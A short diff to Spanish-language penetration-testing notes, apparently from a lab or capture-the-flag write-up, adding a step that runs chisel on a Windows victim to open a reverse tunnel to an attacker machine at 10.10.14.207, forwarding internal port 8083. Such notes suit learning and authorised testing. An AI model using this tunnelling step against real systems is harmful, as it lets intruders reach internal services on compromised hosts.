@@ -293,5 +293,8 @@ vamos a levantar un servidor con chisel por el puerto 1133
 `maquina victima`
 ![[Pasted image 20240404173840.png]]
 
-
+`ejecutamos chisel para windows`
+```python
+.\chisel_windows.exe client 10.10.14.207:1133 R:8083:127.0.0.1:8083
+```
 ![[Pasted image 20240404180732.png]]
